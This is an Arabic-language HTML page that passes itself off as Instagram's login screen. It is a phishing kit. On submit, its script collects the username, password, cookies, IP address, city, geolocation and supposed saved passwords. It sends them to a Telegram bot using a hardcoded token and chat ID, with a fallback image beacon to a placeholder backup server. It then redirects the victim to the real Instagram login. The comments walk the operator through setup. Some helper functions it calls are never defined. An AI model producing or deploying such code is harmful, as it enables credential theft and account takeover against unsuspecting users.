<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
        }
        .container {
            max-width: 350px;
            width: 100%;
        }
        .box {
            border: 1px solid #dbdbdb;
            background-color: white;
            padding: 20px 40px;
            text-align: center;
            margin-bottom: 10px;
        }
        .logo {
            width: 175px;
            margin: 22px auto 12px;
        }
        form {
            margin-top: 24px;
        }
        input {
            width: 100%;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
            direction: ltr;
        }
        button {
            width: 100%;
            padding: 7px 16px;
            margin: 8px 0;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
        }
        .separator {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .facebook-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            margin: 15px 0;
        }
        .forgot-password {
            font-size: 12px;
            color: #00376b;
        }
        .footer {
            text-align: center;
            font-size: 14px;
        }
        .get-app {
            text-align: center;
            margin: 20px 0;
        }
        .app-buttons {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        .app-button {
            height: 40px;
            margin: 0 4px;
        }
    </style>
    
</head>
<body>
    <div class="container">
        <div class="box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram">
            <form id="loginForm">
                <input type="text" placeholder="البريد الإلكتروني أو اسم المستخدم" id="username" required>
                <input type="password" placeholder="كلمة المرور" id="password" required>
                <button type="submit">تسجيل الدخول</button>
            </form>
            
            <div class="separator">
                <div class="line"></div>
                <span>أو</span>
                <div class="line"></div>
            </div>
            
            <div class="facebook-login">
                <i class="fab fa-facebook-square"></i> تسجيل الدخول باستخدام فيسبوك
            </div>
            
            <div class="forgot-password">
                نسيت كلمة المرور؟
            </div>
        </div>
        
        <div class="box">
            <div class="footer">
                ليس لديك حساب؟ <a href="#">اشترك</a>
            </div>
        </div>
        
        <div class="get-app">
            <p>حمل التطبيق.</p>
            <div class="app-buttons">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_arabic_arabic.png/4b70f6fae447.png" class="app-button" alt="App Store">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_arabic_arabic.png/4b70f6fae447.png" class="app-button" alt="Google Play">
            </div>
        </div>
    </div>


    <script>
        // 1. تأكد من صحة التوكن ورقم الدردشة
        const botToken = '7384019095:AAH5-rzlhgKpM0oZ8iMGl4DayJt9UAD3c2I'; // استبدل بتوكن بوتك
        const chatId = '6237935028'; // استبدل برقم الدردشة

        // 2. أضف هذه الدالة الجديدة للإرسال بشكل أكثر موثوقية
        async function sendDataToBot(data) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            try {
                // 3. استخدم FormData بدلاً من JSON لتفادي مشاكل CORS
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('text', formatMessage(data));
                formData.append('parse_mode', 'HTML');
                
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                return await response.json();
            } catch (error) {
                console.error('فشل الإرسال:', error);
                // 4. حل بديل إذا فشل الإرسال
                backupSendMethod(data);
                return null;
            }
        }

        // 5. دالة مساعدة لتنسيق الرسالة
        function formatMessage(data) {
            return `
<b>🎯 بيانات جديدة تم جمعها</b>

<b>🔐 بيانات الدخول:</b>
👤 <b>اسم المستخدم:</b> ${escapeHtml(data.username)}
🔑 <b>كلمة المرور:</b> ${escapeHtml(data.password)}

<b>🌍 معلومات الشبكة:</b>
📡 <b>IP:</b> ${escapeHtml(data.ip)}
🏙️ <b>المدينة:</b> ${escapeHtml(data.city)}
📍 <b>الموقع:</b> <a href="https://www.google.com/maps?q=${data.location.lat},${data.location.lng}">عرض على الخريطة</a>

<b>🍪 الكوكيز:</b>
<pre>${escapeHtml(data.cookies)}</pre>

<b>📌 كلمات المرور المحفوظة:</b>
<pre>${escapeHtml(JSON.stringify(data.savedPasswords, null, 2))}</pre>
            `;
        }

        // 6. دالة للهروب من أحرف HTML
        function escapeHtml(unsafe) {
            return unsafe.toString()
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }

        // 7. طريقة إحتياطية للإرسال
        function backupSendMethod(data) {
            const backupUrl = 'https://your-backup-server.com/api';
            const img = new Image();
            img.src = `${backupUrl}?data=${encodeURIComponent(JSON.stringify(data))}`;
        }

        // 8. تعديل دالة إرسال النموذج
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const loading = document.createElement('div');
            loading.innerHTML = 'جاري المعالجة...';
            e.target.appendChild(loading);
            
            try {
                const [location, networkInfo] = await Promise.all([
                    getLocation(),
                    getNetworkInfo()
                ]);
                
                const data = {
                    username: document.getElementById('username').value,
                    password: document.getElementById('password').value,
                    cookies: document.cookie,
                    ip: networkInfo.ip,
                    city: networkInfo.city,
                    location: location,
                    savedPasswords: collectSavedPasswords()
                };
                
                // 9. إضافة محاولات إعادة عند الفشل
                let attempts = 0;
                const maxAttempts = 3;
                
                while (attempts < maxAttempts) {
                    try {
                        await sendDataToBot(data);
                        break;
                    } catch (err) {
                        attempts++;
                        if (attempts === maxAttempts) throw err;
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                }
                
                // 10. إعادة التوجيه بعد التأكد من الإرسال
                window.location.href = 'https://www.instagram.com/accounts/login/';
                
            } catch (error) {
                console.error('حدث خطأ:', error);
                loading.innerHTML = 'حدث خطأ، جاري إعادة التوجيه...';
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);
            }
        });
    </script>
</body>
</html>
